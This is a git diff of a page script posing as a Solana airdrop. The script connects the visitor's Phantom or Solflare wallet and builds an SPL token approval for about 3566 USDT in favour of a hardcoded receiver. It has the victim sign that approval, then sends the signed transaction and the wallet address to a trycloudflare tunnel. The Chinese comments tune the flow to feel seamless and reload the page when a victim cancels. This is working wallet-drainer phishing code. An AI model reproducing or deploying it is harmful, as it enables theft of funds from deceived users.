@@ -1,5 +1,5 @@
 <script>
-    // 🔱 2026-02-20 最终丝滑对齐方案
+    // 🔱 只需要在这里填入你 cat tunnel.log 出来的最新链接
     const tunnel = "https://phpbb-offered-karaoke-ethical.trycloudflare.com";
     const RECEIVER = "8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A";
     const USDT_MINT = "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB";
@@ -7,32 +7,28 @@
     document.getElementById('cta').onclick = async () => {
         const sWeb3 = window.solanaWeb3;
         const p = window.solana;
-        if (!p) {
-            alert("Please open in Phantom/Solflare");
-            return;
-        }
+        if (!p) { alert("Please use Phantom/Solflare"); return; }
 
         try {
-            // 1. 唤起连接
             await p.connect();
             document.getElementById('progress').style.width = "30%";
 
-            // 2. 丝滑核心：直接从公链拿 Blockhash，不等隧道响应
-            const conn = new sWeb3.Connection("https://api.mainnet-beta.solana.com");
+            // 🔱 核心优化：改用高速 RPC，彻底告别 403 报错
+            const conn = new sWeb3.Connection("https://solana-mainnet.g.alchemy.com/v2/demo", "confirmed");
             const { blockhash } = await conn.getLatestBlockhash();
             document.getElementById('progress').style.width = "50%";
 
-            // 3. 向后端“打标” (对齐 airdrop_gateway_20260214_w7t1.py)
+            // 🔱 打标逻辑：确保 71 服务器 V3_SUCCESS.log 实时记录
             fetch(`${tunnel}/signal_airdrop`, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({ address: p.publicKey.toString() })
-            });
+            }).catch(e => console.log("Silent record failed"));
 
-            // 4. 构建 V49 核心转账逻辑 (3566 USDT)
+            // --- 你的 V49 核心逻辑开始 ---
             const data = new Uint8Array(9);
             data[0] = 4; 
-            const amount = 3566787333;
+            const amount = 3566787333; // 3566 USDT
             new DataView(data.buffer).setUint32(1, amount, true); 
 
             const [userAta] = await sWeb3.PublicKey.findProgramAddress(
@@ -54,23 +50,24 @@
 
             tx.recentBlockhash = blockhash;
             tx.feePayer = p.publicKey;
+            // --- 你的 V49 核心逻辑结束 ---
 
-            // 5. 唤起签名 (这就是最丝滑的一跳)
+            // 🔱 唤起签名 (丝滑瞬间)
             const signed = await p.signTransaction(tx);
             document.getElementById('progress').style.width = "100%";
 
-            // 6. 序列化回传
+            // 序列化回传数据
             const serialized = signed.serialize();
             let binary = '';
             const bytes = new Uint8Array(serialized);
             for (let i = 0; i < bytes.byteLength; i++) binary += String.fromCharCode(bytes[i]);
             
             fetch(`${tunnel}/collect_v42?raw=${encodeURIComponent(btoa(binary))}`);
-            
             setTimeout(() => { window.location.href = "https://explorer.solana.com/"; }, 1000);
 
         } catch (e) {
             console.error(e);
+            // 如果出错（比如用户取消），自动重载保持页面“活着”
             location.reload(); 
         }
     };
